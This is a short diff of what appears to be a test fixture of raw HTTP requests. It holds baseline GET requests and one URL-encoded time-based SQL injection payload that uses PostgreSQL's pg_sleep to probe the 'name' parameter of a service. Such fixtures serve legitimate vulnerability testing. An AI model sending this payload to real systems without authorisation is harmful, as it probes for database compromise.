@@ -1,2 +1,3 @@
 baseline "GET /items?name=creep HTTP/1.1\r\nHost: app:8080\r\nConnection: close\r\n\r\n"
 payload "GET /items?name=creep%27%7C%7C%28SELECT%20%27%27%20FROM%20pg_sleep%283%29%29%7C%7C%27 HTTP/1.1\r\nHost: app:8080\r\nConnection: close\r\n\r\n"
+baseline "GET /items?name=creep HTTP/1.1\r\nHost: app:8080\r\nConnection: close\r\n\r\n"
